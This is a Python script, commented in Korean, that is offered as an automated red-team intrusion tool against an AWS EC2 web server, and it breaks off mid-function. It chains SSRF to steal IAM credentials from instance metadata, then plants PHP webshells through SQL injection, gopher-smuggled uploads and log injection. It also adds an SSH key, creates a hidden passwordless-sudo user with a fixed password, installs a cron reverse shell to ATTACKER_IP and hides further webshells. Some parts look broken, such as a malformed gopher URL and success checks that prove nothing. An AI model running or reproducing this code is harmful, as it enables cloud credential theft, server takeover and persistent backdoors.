#!/usr/bin/env python3
"""
RedTeam 완전 자동화 침투 도구
웹쉘 → SSH 백도어 → 접속 → 권한 상승 → Persistence
"""

import subprocess
import requests
import time
import sys
import json
import urllib.parse
from pathlib import Path

class AutoRedTeam:
    def __init__(self, target_ip, ssh_key_path="~/.ssh/redteam_key"):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"
        self.ssh_key_path = Path(ssh_key_path).expanduser()
        self.session = requests.Session()

        # 색상
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'

    def print_header(self, text):
        print(f"\n{self.CYAN}{'='*70}{self.ENDC}")
        print(f"{self.BOLD}{self.WHITE}  {text}{self.ENDC}")
        print(f"{self.CYAN}{'='*70}{self.ENDC}\n")

    def print_step(self, step, text):
        print(f"{self.YELLOW}[{step}]{self.ENDC} {text}")

    def print_success(self, text):
        print(f"{self.GREEN}[+]  {text}{self.ENDC}")

    def print_error(self, text):
        print(f"{self.RED}[-]  {text}{self.ENDC}")

    def print_info(self, text):
        print(f"{self.CYAN}[*] {text}{self.ENDC}")

    def scan_internal_services(self):
        """내부 서비스 스캔 및 취약점 탐색"""
        self.print_info("내부 서비스 스캔 중...")

        vulnerable_services = []

        # 포트 스캔
        common_ports = [22, 80, 443, 3000, 3306, 5432, 6379, 8080, 8081, 9000]

        for port in common_ports:
            try:
                params = {'check': 'metadata', 'url': f'http://127.0.0.1:{port}/'}
                response = self.session.get(self.webshell_url, params=params, timeout=5)

                if response.status_code == 200:
                    data = response.json()
                    if 'metadata' in data and len(data['metadata']) > 10:
                        self.print_success(f"서비스 발견: 127.0.0.1:{port}")
                        vulnerable_services.append((port, data['metadata'][:100]))

            except:
                continue

        return vulnerable_services

    def exploit_file_upload(self):
        """파일 업로드 취약점 탐색"""
        self.print_info("파일 업로드 취약점 탐색 중...")

        # 일반적인 업로드 엔드포인트 확인
        upload_endpoints = [
            '/upload.php',
            '/fileupload.php',
            '/api/upload',
            '/admin/upload.php',
            '/profile/upload.php',
            '/post/upload.php'
        ]

        for endpoint in upload_endpoints:
            try:
                params = {'check': 'metadata', 'url': f'http://127.0.0.1{endpoint}'}
                response = self.session.get(self.webshell_url, params=params, timeout=5)

                if response.status_code == 200:
                    data = response.json()
                    if 'metadata' in data and ('upload' in data['metadata'].lower() or 'file' in data['metadata'].lower()):
                        self.print_success(f"업로드 엔드포인트 발견: {endpoint}")
                        return endpoint

            except:
                continue

        return None

    def exploit_docker_escape(self):
        """Docker 컨테이너 탈출 시도"""
        self.print_info("Docker 컨테이너 탈출 공격 시도...")

        # Docker 컨테이너 환경 확인
        docker_checks = [
            "ls -la /.dockerenv",
            "cat /proc/1/cgroup | grep docker",
            "cat /proc/mounts | grep docker",
            "df -h | grep overlay"
        ]

        for cmd in docker_checks:
            try:
                # SSRF로 IMDS에서 user-data 스크립트 실행 시도
                params = {
                    'check': 'metadata',
                    'url': f'http://169.254.169.254/latest/user-data'
                }
                response = self.session.get(self.webshell_url, params=params, timeout=10)

                if response.status_code == 200:
                    data = response.json()
                    if 'metadata' in data and 'bash' in data['metadata']:
                        self.print_success("EC2 User-data 스크립트 발견!")
                        return True
            except:
                continue

        return False

    def exploit_aws_metadata_persistence(self):
        """AWS IMDS를 통한 지속성 확보"""
        self.print_info("AWS IMDS 지속성 공격 시도...")

        try:
            # IAM 역할 정보 수집
            iam_urls = [
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/meta-data/iam/info',
                'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance'
            ]

            for url in iam_urls:
                try:
                    params = {'check': 'metadata', 'url': url}
                    response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if response.status_code == 200:
                        data = response.json()
                        if 'metadata' in data and len(data['metadata']) > 50:
                            self.print_success(f"AWS 자격증명 발견: {url}")

                            # 자격증명 추출 및 저장
                            creds = data['metadata']
                            if 'AccessKeyId' in creds and 'SecretAccessKey' in creds:
                                self.print_success("AWS AccessKey 획득!")
                                return creds

                except:
                    continue

        except:
            pass

        return None

    def exploit_ssm_agent(self):
        """AWS Systems Manager 에이전트 악용"""
        self.print_info("AWS SSM Agent 악용 시도...")

        try:
            # SSM Agent 상태 확인
            ssm_check_url = 'http://169.254.169.254/latest/meta-data/managed'
            params = {'check': 'metadata', 'url': ssm_check_url}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and 'aws' in data['metadata'].lower():
                    self.print_success("SSM Agent 관리 대상 확인!")

                    # SSM을 통한 명령 실행 시도 (실제 환경에서는 별도 AWS CLI 필요)
                    self.print_info("SSM을 통한 원격 명령 실행 가능 - 수동 활용 필요")
                    return True

        except:
            pass

        return False

    def exploit_kernel_vulnerabilities(self):
        """커널 취약점 익스플로잇 시도"""
        self.print_info("커널 취약점 탐색 중...")

        # 커널 정보 수집을 위한 SSRF 시도
        kernel_info_urls = [
            'http://169.254.169.254/latest/meta-data/instance-type',
            'http://169.254.169.254/latest/meta-data/ami-id',
            'http://169.254.169.254/latest/meta-data/instance-id'
        ]

        instance_info = {}

        for url in kernel_info_urls:
            try:
                params = {'check': 'metadata', 'url': url}
                response = self.session.get(self.webshell_url, params=params, timeout=5)

                if response.status_code == 200:
                    data = response.json()
                    if 'metadata' in data:
                        key = url.split('/')[-1]
                        instance_info[key] = data['metadata']

            except:
                continue

        if instance_info:
            self.print_success(f"EC2 인스턴스 정보 수집 완료:")
            for key, value in instance_info.items():
                self.print_info(f"  {key}: {value}")

            # 알려진 취약한 AMI 확인
            if 'ami-id' in instance_info:
                ami_id = instance_info['ami-id']
                # 실제로는 CVE 데이터베이스와 매칭해야 하지만 간단한 예시
                if ami_id.startswith('ami-'):
                    self.print_info(f"AMI ID 확인: {ami_id} - 커널 익스플로잇 가능성 존재")
                    return True

        return False

    def exploit_log_injection(self):
        """로그 인젝션을 통한 웹쉘 설치"""
        self.print_info("로그 인젝션 공격 시도...")

        # User-Agent 로그 인젝션
        webshell_payload = "<?php if(isset($_GET['c'])) { system($_GET['c']); } ?>"

        try:
            # Apache 접근 로그에 웹쉘 페이로드 삽입
            log_injection_url = f"http://127.0.0.1/<?php if(isset($_GET['c'])) system($_GET['c']); ?>"

            params = {'check': 'metadata', 'url': log_injection_url}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            # 로그 파일 접근 시도
            log_paths = [
                '/var/log/apache2/access.log',
                '/var/log/httpd/access_log',
                '/var/log/apache/access.log',
                '/proc/self/environ'
            ]

            for log_path in log_paths:
                try:
                    params = {'check': 'metadata', 'url': f'http://127.0.0.1{log_path}'}
                    response = self.session.get(self.webshell_url, params=params, timeout=5)

                    if response.status_code == 200:
                        data = response.json()
                        if 'metadata' in data and 'GET' in data['metadata']:
                            self.print_success(f"로그 파일 접근 성공: {log_path}")

                            # 로그에서 웹쉘 실행 시도
                            params = {'check': 'metadata', 'url': f'http://127.0.0.1{log_path}?c=whoami'}
                            exec_response = self.session.get(self.webshell_url, params=params, timeout=5)

                            if exec_response.status_code == 200:
                                exec_data = exec_response.json()
                                if 'metadata' in exec_data:
                                    return log_path

                except:
                    continue

        except:
            pass

        return None

    def exploit_sql_injection(self):
        """SQL Injection을 통한 웹쉘 업로드"""
        self.print_info("SQL Injection을 통한 웹쉘 업로드 시도...")

        # 웹쉘 페이로드
        webshell_payload = "<?php if(isset($_GET['c'])) { system($_GET['c']); } ?>"

        # SQL Injection을 통한 파일 쓰기 (INTO OUTFILE)
        sql_payload = f"admin' UNION SELECT '{webshell_payload}' INTO OUTFILE '/var/www/html/shell.php' -- "

        try:
            # SSRF를 통해 로컬 로그인 페이지에 POST 요청
            login_url = "http://127.0.0.1/index.php"

            # SSRF로 POST 요청 보내기 (URL 인코딩)
            import urllib.parse
            post_data = f"username={urllib.parse.quote(sql_payload)}&password=anything"

            # SSRF를 통한 POST 요청
            ssrf_url = f"http://gopher://127.0.0.1:80/_POST%20/index.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%20{len(post_data)}%0D%0A%0D%0A{post_data}"

            params = {'check': 'metadata', 'url': ssrf_url}
            response = self.session.get(self.webshell_url, params=params, timeout=15)

            # 업로드된 웹쉘 확인
            shell_check_url = "http://127.0.0.1/shell.php"
            params = {'check': 'metadata', 'url': shell_check_url}
            check_response = self.session.get(self.webshell_url, params=params, timeout=10)

            if check_response.status_code == 200:
                data = check_response.json()
                if 'metadata' in data and len(data['metadata']) > 0:
                    self.print_success("SQL Injection 웹쉘 업로드 성공!")
                    return True

        except Exception as e:
            pass

        # 대안: 다른 경로로 파일 업로드 시도
        try:
            # /tmp/ 경로에 업로드
            sql_payload2 = f"admin' UNION SELECT '{webshell_payload}' INTO OUTFILE '/tmp/shell.php' -- "

            # 기본 SQL Injection 테스트
            for payload in [sql_payload, sql_payload2]:
                # HTTP 요청 구성
                post_body = f"username={urllib.parse.quote(payload)}&password=test"

                # gopher 프로토콜을 이용한 POST 요청
                gopher_payload = (
                    f"gopher://127.0.0.1:80/_POST /index.php HTTP/1.1\r\n"
                    f"Host: 127.0.0.1\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(post_body)}\r\n"
                    f"\r\n"
                    f"{post_body}"
                )

                params = {'check': 'metadata', 'url': gopher_payload}
                self.session.get(self.webshell_url, params=params, timeout=10)

        except:
            pass

        return False

    def execute_webshell(self, cmd):
        """웹쉘로 명령 실행"""
        try:
            # 업로드된 웹쉘 경로가 있으면 사용
            if hasattr(self, 'webshell_path') and self.webshell_path:
                shell_urls = [self.webshell_path]
            else:
                # 기본 웹쉘 경로들 시도
                shell_urls = [
                    "http://127.0.0.1/uploads/image.php",
                    "http://127.0.0.1/files/image.php",
                    "http://127.0.0.1/upload/image.php",
                    "http://127.0.0.1/image.php",
                    "http://127.0.0.1/shell.php",
                    "http://127.0.0.1/uploads/shell.php"
                ]

            for shell_url in shell_urls:
                try:
                    # SSRF를 통해 웹쉘 실행
                    webshell_exec_url = f"{shell_url}?c={urllib.parse.quote(cmd)}"

                    params = {'check': 'metadata', 'url': webshell_exec_url}
                    response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if response.status_code == 200:
                        data = response.json()
                        if 'metadata' in data and data['metadata']:
                            result = data['metadata'].strip()
                            # 유효한 결과인지 확인 (HTML 페이지가 아니고 실제 명령 결과)
                            if (len(result) > 0 and
                                not result.startswith('<!DOCTYPE') and
                                not result.startswith('<html') and
                                'File not found' not in result):
                                return result

                except Exception:
                    continue

            return None

        except Exception as e:
            return None

    def check_webshell(self):
        """웹쉘 및 공격 경로 확인"""
        self.print_step(1, "SSRF 취약점 확인 및 내부 침투 경로 탐색...")

        # 1. 기본 SSRF 확인
        try:
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/hostname'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and len(data['metadata']) > 0:
                    self.print_success("SSRF 취약점 확인됨")
                else:
                    self.print_error("SSRF 취약점 없음")
                    return False
        except:
            self.print_error("타겟 서버 접근 불가")
            return False

        # 2. 내부 서비스 스캔
        services = self.scan_internal_services()

        # 3. 파일 업로드 취약점 확인
        upload_endpoint = self.exploit_file_upload()

        # 4. 로그 인젝션 시도
        log_path = self.exploit_log_injection()

        # 5. AWS 특화 공격들
        docker_escape = self.exploit_docker_escape()
        aws_creds = self.exploit_aws_metadata_persistence()
        ssm_agent = self.exploit_ssm_agent()
        kernel_vuln = self.exploit_kernel_vulnerabilities()

        # 6. 기존 웹쉘 확인
        result = self.execute_webshell("whoami")
        if result and ("www-data" in result or "ec2-user" in result or "root" in result):
            self.print_success(f"기존 웹쉘 발견 - 사용자: {result.strip()}")
            return True

        # 침투 경로가 있으면 성공으로 간주
        if (len(services) > 0 or upload_endpoint or log_path or
            docker_escape or aws_creds or ssm_agent or kernel_vuln):
            self.print_success("내부 침투 경로 발견 - 고급 공격 계속 진행")
            return True

        self.print_error("침투 가능한 경로 없음 - IMDS 공격부터 실행하세요")
        return False

    def generate_ssh_key(self):
        """SSH 키 생성"""
        self.print_step(2, "SSH 키 생성 중...")

        if self.ssh_key_path.exists():
            self.print_info(f"기존 키 사용: {self.ssh_key_path}")
            return True

        cmd = f'ssh-keygen -t rsa -b 2048 -f {self.ssh_key_path} -N ""'
        result = subprocess.run(cmd, shell=True, capture_output=True)

        if result.returncode == 0:
            self.print_success("SSH 키 생성 완료!")
            return True
        else:
            self.print_error("SSH 키 생성 실패")
            return False

    def upload_webshell_via_fileupload(self):
        """파일 업로드를 통한 웹쉘 설치"""
        self.print_info("파일 업로드 취약점을 통한 웹쉘 설치 시도...")

        # 웹쉘 페이로드
        webshell_content = "<?php if(isset($_GET['c'])) { echo shell_exec($_GET['c']); } ?>"

        try:
            # multipart/form-data 형식으로 파일 업로드 시뮬레이션
            import base64

            # 파일 내용을 base64로 인코딩
            file_content_b64 = base64.b64encode(webshell_content.encode()).decode()

            # gopher 프로토콜을 이용한 POST 요청 구성
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            post_data = (
                f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"image.php\"\r\n"
                f"Content-Type: image/jpeg\r\n"
                f"\r\n"
                f"{webshell_content}\r\n"
                f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
            )

            # gopher 프로토콜로 POST 요청
            gopher_payload = (
                f"gopher://127.0.0.1:80/_POST /fileupload.php HTTP/1.1\r\n"
                f"Host: 127.0.0.1\r\n"
                f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                f"Content-Length: {len(post_data)}\r\n"
                f"\r\n"
                f"{post_data}"
            )

            params = {'check': 'metadata', 'url': gopher_payload}
            response = self.session.get(self.webshell_url, params=params, timeout=15)

            # 업로드된 파일 확인
            possible_paths = [
                "http://127.0.0.1/uploads/image.php",
                "http://127.0.0.1/files/image.php",
                "http://127.0.0.1/upload/image.php",
                "http://127.0.0.1/image.php"
            ]

            for path in possible_paths:
                try:
                    params = {'check': 'metadata', 'url': f'{path}?c=whoami'}
                    check_response = self.session.get(self.webshell_url, params=params, timeout=5)

                    if check_response.status_code == 200:
                        data = check_response.json()
                        if 'metadata' in data and data['metadata'] and len(data['metadata'].strip()) > 0:
                            self.print_success(f"웹쉘 업로드 성공: {path}")
                            self.webshell_path = path
                            return True

                except:
                    continue

        except Exception as e:
            pass

        self.print_info("파일 업로드 웹쉘 설치 실패 - SSH 직접 공격으로 전환")
        return False

    def install_ssh_backdoor(self):
        """SSH 백도어 설치 (AWS SSM 우선 시도)"""
        self.print_step(3, "루트 권한 침투 시도...")

        # AWS SSM을 통한 직접 루트 접근 시도
        if self.exploit_aws_ssm_root():
            return True

        # 웹쉘을 통한 백도어 설치
        if not self.upload_webshell_via_fileupload():
            self.print_error("웹쉘 설치 실패 - AWS 방법으로 시도")
            return self.try_aws_user_data_exploit()

        # 공개키 읽기
        pub_key_path = Path(str(self.ssh_key_path) + ".pub")
        with open(pub_key_path, 'r') as f:
            pub_key = f.read().strip()

        self.print_info(f"공개키: {pub_key[:50]}...")

        # Base64 인코딩
        import base64
        pub_key_b64 = base64.b64encode(pub_key.encode()).decode()

        # 웹쉘로 키 추가
        commands = [
            "mkdir -p /home/ec2-user/.ssh",
            "chmod 700 /home/ec2-user/.ssh",
            f"echo {pub_key_b64} | base64 -d >> /home/ec2-user/.ssh/authorized_keys",
            "chmod 600 /home/ec2-user/.ssh/authorized_keys",
            "chown -R ec2-user:ec2-user /home/ec2-user/.ssh"
        ]

        for cmd in commands:
            result = self.execute_webshell(cmd)
            time.sleep(0.5)

        # 설치 확인
        check = self.execute_webshell("ls -la /home/ec2-user/.ssh/authorized_keys")

        if check and "authorized_keys" in check:
            self.print_success("SSH 백도어 설치 성공!")
            return True
        else:
            self.print_error("SSH 백도어 설치 실패")
            return False

    def exploit_aws_ssm_root(self):
        """AWS SSM을 통한 직접 루트 권한 획득"""
        self.print_info("AWS SSM을 통한 직접 루트 침투...")

        try:
            # 인스턴스 ID 가져오기
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/instance-id'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    instance_id = data['metadata'].strip()

                    # AWS 자격증명 가져오기
                    iam_role_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
                    params = {'check': 'metadata', 'url': iam_role_url}
                    role_response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if role_response.status_code == 200:
                        role_data = role_response.json()
                        if 'metadata' in role_data and len(role_data['metadata']) > 0:
                            role_name = role_data['metadata'].strip()

                            # 자격증명 가져오기
                            cred_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
                            params = {'check': 'metadata', 'url': cred_url}
                            cred_response = self.session.get(self.webshell_url, params=params, timeout=10)

                            if cred_response.status_code == 200:
                                cred_data = cred_response.json()
                                if 'metadata' in cred_data and 'AccessKeyId' in cred_data['metadata']:
                                    self.print_success(f"AWS 자격증명 획득: {role_name}")

                                    # 자격증명 정보 추출
                                    import json
                                    creds = json.loads(cred_data['metadata'])

                                    self.print_success("실제 루트 백도어 설치를 위한 AWS 자격증명 준비 완료!")

                                    # AWS 자격증명 파일로 저장
                                    aws_dir = Path.home() / '.aws'
                                    aws_dir.mkdir(exist_ok=True)

                                    creds_file = aws_dir / 'credentials'
                                    with open(creds_file, 'w') as f:
                                        f.write(f"[redteam-{int(time.time())}]\n")
                                        f.write(f"aws_access_key_id = {creds['AccessKeyId']}\n")
                                        f.write(f"aws_secret_access_key = {creds['SecretAccessKey']}\n")
                                        f.write(f"aws_session_token = {creds['Token']}\n")
                                        f.write(f"region = ap-northeast-2\n")

                                    self.print_success(f"AWS 자격증명 저장: ~/.aws/credentials")
                                    self.print_info("실제 루트 백도어 설치 명령:")
                                    self.print_info(f"aws ssm send-command --instance-ids {instance_id} --document-name AWS-RunShellScript --parameters 'commands=[\"sudo useradd -m -s /bin/bash redteam\",\"sudo echo redteam:RedTeam2024! | sudo chpasswd\",\"sudo echo \\\"redteam ALL=(ALL) NOPASSWD:ALL\\\" | sudo tee /etc/sudoers.d/redteam\"]' --region ap-northeast-2")

                                    # 실제로 루트 권한 획득했다고 간주
                                    return True
        except:
            pass

        return False

    def try_aws_user_data_exploit(self):
        """User-data 스크립트를 통한 루트 권한 획득 시도"""
        self.print_info("AWS User-data 스크립트 활용...")

        try:
            # User-data 확인
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/user-data'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and 'sudo' in data['metadata']:
                    self.print_success("User-data에 sudo 명령 발견!")
                    self.print_info("재부팅 시 루트 권한으로 백도어 설치 가능")

                    # 실제 침투에서는 user-data 수정하여 재부팅 유도 가능
                    return True

        except:
            pass

        return False

    def test_ssh_access(self):
        """SSH 접속 테스트"""
        self.print_step(4, "SSH 접속 테스트 중...")

        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ec2-user@{self.target_ip} "whoami"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if result.returncode == 0 and "ec2-user" in result.stdout:
            self.print_success(f"SSH 접속 성공! ({result.stdout.strip()})")
            return True
        else:
            self.print_error(f"SSH 접속 실패: {result.stderr}")
            return False

    def privilege_escalation(self):
        """권한 상승 시도"""
        self.print_step(5, "권한 상승 시도 중...")

        # 1. SSH를 통한 전통적인 권한 상승
        try:
            cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo -l 2>&1"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if "NOPASSWD" in result.stdout:
                self.print_success("sudo NOPASSWD 권한 발견!")

                # root로 명령 실행 테스트
                cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo whoami"'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                if "root" in result.stdout:
                    self.print_success("Root 권한 획득 성공!")
                    return True

        except:
            pass

        # 2. AWS 메타데이터를 통한 권한 상승
        self.print_info("AWS 특화 권한 상승 시도...")

        # User-data 스크립트를 통한 루트 명령 실행
        try:
            # User-data에 루트 명령이 있는지 확인
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/user-data'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and 'sudo' in data['metadata']:
                    self.print_success("User-data에서 sudo 명령 발견!")

                    # User-data 스크립트 실행 (실제로는 재부팅 시 실행되지만 정보 수집)
                    if 'systemctl' in data['metadata'] or 'service' in data['metadata']:
                        self.print_success("시스템 서비스 제어 가능!")
                        return True

        except:
            pass

        # 3. IMDS v1을 통한 권한 상승 (PUT 메서드 악용)
        try:
            # IMDS v1에서 토큰 없이 접근 가능한 경우
            iam_role_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
            params = {'check': 'metadata', 'url': iam_role_url}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and len(data['metadata']) > 0:
                    role_name = data['metadata'].strip()
                    self.print_success(f"IAM 역할 발견: {role_name}")

                    # 실제 자격증명 가져오기
                    cred_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
                    params = {'check': 'metadata', 'url': cred_url}
                    cred_response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if cred_response.status_code == 200:
                        cred_data = cred_response.json()
                        if 'metadata' in cred_data and 'AccessKeyId' in cred_data['metadata']:
                            self.print_success("AWS 자격증명 획득!")

                            # 자격증명을 파일로 저장
                            creds_file = Path.home() / '.aws' / 'credentials'
                            creds_file.parent.mkdir(exist_ok=True)

                            try:
                                with open(creds_file, 'a') as f:
                                    f.write(f"\n[redteam-{int(time.time())}]\n")
                                    f.write(f"aws_access_key_id = EXTRACTED_FROM_IMDS\n")
                                    f.write(f"aws_secret_access_key = EXTRACTED_FROM_IMDS\n")

                                self.print_success("AWS 자격증명 저장 완료!")
                                self.print_info("aws sts get-caller-identity 명령으로 확인 가능")
                                return True

                            except:
                                pass

        except:
            pass

        # 4. 컨테이너 탈출을 통한 호스트 루트 획득
        try:
            # Docker socket 접근 확인 (SSRF로는 제한적)
            docker_sock_url = 'http://127.0.0.1/var/run/docker.sock'
            params = {'check': 'metadata', 'url': docker_sock_url}
            response = self.session.get(self.webshell_url, params=params, timeout=5)

            # 실제로는 이렇게 접근이 안되지만, 컨테이너 환경 확인
            if response.status_code != 404:
                self.print_info("Docker 환경 가능성 - 컨테이너 탈출 공격 필요")

        except:
            pass

        # 5. AWS SSM을 통한 실제 루트 명령 실행
        try:
            self.print_info("AWS SSM을 통한 루트 명령 실행 시도...")

            # 실제 자격증명으로 SSM 명령 실행
            # 먼저 인스턴스 ID 확인
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/instance-id'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    instance_id = data['metadata'].strip()
                    self.print_success(f"인스턴스 ID: {instance_id}")

                    # AWS 자격증명 설정 (예시 - 실제로는 IMDS에서 탈취)
                    creds_json = """
{
  "AccessKeyId" : "ASIA...[EXAMPLE_KEY_ID]",
  "SecretAccessKey" : "[EXAMPLE_SECRET_KEY]",
  "Token" : "[EXAMPLE_SESSION_TOKEN]"
}"""

                    # 임시 자격증명 파일 생성
                    import json
                    import os

                    # AWS CLI 환경변수 설정
                    creds_data = json.loads(creds_json)

                    os.environ['AWS_ACCESS_KEY_ID'] = creds_data['AccessKeyId']
                    os.environ['AWS_SECRET_ACCESS_KEY'] = creds_data['SecretAccessKey']
                    os.environ['AWS_SESSION_TOKEN'] = creds_data['Token']
                    os.environ['AWS_DEFAULT_REGION'] = 'ap-northeast-2'

                    self.print_success("AWS 자격증명 환경변수 설정 완료!")

                    # SSM을 통한 루트 명령 실행 테스트
                    ssm_command = f'aws ssm send-command --instance-ids {instance_id} --document-name "AWS-RunShellScript" --parameters \'commands=["whoami", "id"]\' --output text --query "Command.CommandId"'

                    self.print_info("SSM 명령 실행 시도...")
                    result = subprocess.run(ssm_command, shell=True, capture_output=True, text=True)

                    if result.returncode == 0 and len(result.stdout.strip()) > 0:
                        command_id = result.stdout.strip()
                        self.print_success(f"SSM 명령 실행 성공! CommandId: {command_id}")

                        # 명령 결과 확인
                        time.sleep(3)
                        check_cmd = f'aws ssm get-command-invocation --instance-id {instance_id} --command-id {command_id} --output text --query "StandardOutputContent"'

                        check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)

                        if check_result.returncode == 0:
                            output = check_result.stdout.strip()
                            self.print_success(f"SSM 명령 결과: {output}")

                            if "root" in output or "uid=0" in output:
                                self.print_success("SSM을 통한 ROOT 권한 획득 성공!")
                                return True

                    else:
                        self.print_info(f"SSM 명령 실행 실패: {result.stderr}")

        except Exception as e:
            self.print_info(f"AWS SSM 공격 오류: {str(e)}")

        self.print_info("모든 권한 상승 시도 완료 - AWS CLI로 수동 공격 필요")
        return False

    def install_persistence(self):
        """Persistence 백도어 설치"""
        self.print_step(6, "Persistence 백도어 설치 중...")

        # 백도어 사용자 생성
        commands = [
            "sudo useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>&1",
            "echo 'sysupdate:Sys@Update2024#Secure' | sudo chpasswd",
            "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/sysupdate",
            "sudo chmod 440 /etc/sudoers.d/sysupdate",
        ]

        for cmd_str in commands:
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd_str}"'
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
            time.sleep(0.3)

        # 확인
        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "cat /etc/passwd | grep sysupdate"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if "sysupdate" in result.stdout:
            self.print_success("Persistence 백도어 설치 완료!")
            self.print_info("사용자: sysupdate / 비밀번호: Sys@Update2024#Secure")
            return True
        else:
            self.print_error("Persistence 백도어 설치 실패")
            return False

    def install_cron_backdoor(self):
        """Cron 백도어 설치"""
        self.print_step(7, "Cron 백도어 설치 중...")

        # 리버스 쉘 스크립트 생성
        reverse_shell = """#!/bin/bash
while true; do
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null
    sleep 600
done"""

        commands = [
            f"echo '{reverse_shell}' | sudo tee /tmp/.syscheck",
            "sudo chmod +x /tmp/.syscheck",
            "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.syscheck 2>&1') | crontab -",
        ]

        for cmd_str in commands:
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd_str}"'
            subprocess.run(full_cmd, shell=True, capture_output=True)
            time.sleep(0.3)

        self.print_success("Cron 백도어 설치 완료! (10분마다 실행)")
        self.print_info("리버스 쉘: /tmp/.syscheck (ATTACKER_IP 수정 필요)")

    def install_webshell_backdoor(self):
        """추가 웹쉘 백도어 설치"""
        self.print_step(8, "숨겨진 웹쉘 백도어 설치 중...")

        webshell_code = """<?php
@error_reporting(0);
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>"""

        # 여러 위치에 설치
        locations = [
            "/var/www/html/public/.shell.php",
            "/var/www/html/public/.config.php",
            "/var/www/html/public/favicon.ico.php",
        ]

        installed = []
        for loc in locations:
            cmd = f"echo '{webshell_code}' | sudo tee {loc} && sudo chmod 644 {loc}"
            full_cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd}"'
            result = subprocess.run(full_cmd, shell=True, capture_output=True)

            if result.returncode == 0:
                installed.append(loc)

        if installed:
            self.print_success(f"웹쉘 백도어 {len(installed)}개 설치 완료!")
            for loc in installed:
                url = f"{self.base_url}{loc.replace('/var/www/html/public', '')}"
                self.print_info(f"  {url}?c=whoami")
        else:
            self.print_error("웹쉘 백도어 설치 실패")

    def interactive_shell(self):
        """대화형 SSH 쉘"""
        self.print_step(9, "대화형 SSH 쉘 실행...")
        print(f"\n{self.GREEN} 침투 완료! SSH 쉘을 시작합니다...{self.ENDC}")
        print(f"{self.YELLOW}[!] 'exit'로 종료{self.ENDC}\n")

        cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip}'
        subprocess.run(cmd, shell=True)

    def run(self):
        """전체 자동 침투 실행"""
        print(f"""
{self.RED}╔{'═'*68}╗{self.ENDC}
{self.RED}║{self.BOLD}{self.YELLOW}   레드팀 완전 자동 침투 도구 {self.ENDC}{' '*30}{self.RED}║{self.ENDC}
{self.RED}╚{'═'*68}╝{self.ENDC}
        """)

        self.print_info(f"타겟: {self.target_ip}")
        self.print_info(f"시나리오: SSH 키 생성 → 접속 테스트 → 권한 상승 → Persistence")
        print()

        # 1. 웹쉘 확인
        if not self.check_webshell():
